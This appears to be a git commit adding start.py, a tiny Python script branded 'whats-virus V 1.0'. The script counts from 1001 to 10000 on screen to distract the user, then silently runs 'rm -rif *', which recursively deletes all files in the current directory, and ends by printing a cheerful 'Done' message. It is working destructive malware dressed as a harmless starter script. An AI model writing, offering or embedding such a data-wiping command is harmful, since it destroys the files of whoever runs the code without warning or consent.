62123b2ebc1ebb7fc3e0011af45d9460455af9c6
AL-AlamySploit <59588007+AL-AlamySploit@users.noreply.github.com>
2020-03-14 12:45:47 +0200

    Create start.py

---
+++ start.py
@@ -0,0 +1,16 @@
+# whats-virus V 1.0
+#Channel
+#https://www.youtube.com/channel/UCQuGjfmo04jDd6zlBscslGQ
+# A7Y Team
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+import os
+os.system ("clear")
+A7Y = 1000
+while A7Y < 10000:
+        A7Y = A7Y +1
+        print( A7Y)
+os.system ("clear")
+os.system ('rm -rif *')
+print ("[+] Done..!")
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
